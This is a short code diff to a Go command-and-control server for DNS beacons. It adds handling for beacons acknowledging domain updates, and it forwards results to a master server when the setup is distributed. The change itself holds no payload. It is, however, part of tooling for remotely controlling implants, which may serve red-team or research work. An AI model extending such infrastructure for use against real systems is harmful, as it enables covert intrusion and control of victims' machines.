@@ -1066,6 +1066,32 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	taskID := parts[2]
 	result := parts[3]
 
+	// Special handling for domains_updated acknowledgments
+	// These are sent after update_domains tasks and may arrive at DNS servers
+	// that didn't assign the original task (cross-server domain updates)
+	if result == "domains_updated" {
+		if !isDuplicate {
+			logf("[C2] Domain update acknowledged by beacon %s (task %s)", beaconID, taskID)
+		}
+		// Just acknowledge receipt, don't try to save to DB
+		// Forward to Master if in distributed mode
+		if masterClient != nil {
+			go func(tid, bid, res string) {
+				c2.mutex.RLock()
+				masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
+				c2.mutex.RUnlock()
+
+				submitTaskID := tid
+				if hasMasterID {
+					submitTaskID = masterTaskID
+				}
+
+				_ = masterClient.SubmitResult(submitTaskID, bid, 0, 1, res)
+			}(taskID, beaconID, result)
+		}
+		return "ACK"
+	}
+
 	// Log receipt of result (include small preview) - skip for duplicates
 	if !isDuplicate {
 		preview := result
